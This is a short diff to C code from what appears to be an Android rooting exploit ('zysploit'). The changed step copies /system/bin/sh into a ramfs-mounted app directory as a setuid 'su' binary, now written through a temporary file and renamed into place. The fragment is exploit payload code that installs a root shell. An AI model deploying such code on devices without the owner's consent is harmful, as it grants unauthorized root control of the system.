@@ -35,8 +35,10 @@ int main(int argc, char **argv)
 		mkdir("/data/data/com.unrevoked.zysploit/root");
 		system("mount -t ramfs none /data/data/com.unrevoked.zysploit/root");
 		chmod("/data/data/com.unrevoked.zysploit/root", 0755);
-		system("cat /system/bin/sh > /data/data/com.unrevoked.zysploit/root/su");
-		chmod("/data/data/com.unrevoked.zysploit/root/su", 06755);
+		system("cat /system/bin/sh > /data/data/com.unrevoked.zysploit/root/su_");
+		chmod("/data/data/com.unrevoked.zysploit/root/su_", 06755);
+		unlink("/data/data/com.unrevoked.zysploit/root/su");
+		rename("/data/data/com.unrevoked.zysploit/root/su_", "/data/data/com.unrevoked.zysploit/root/su");
 		printf("LThere should now be a /data/data/com.unrevoked.zysploit/root/su installed.\n");
 		
 		return 0;
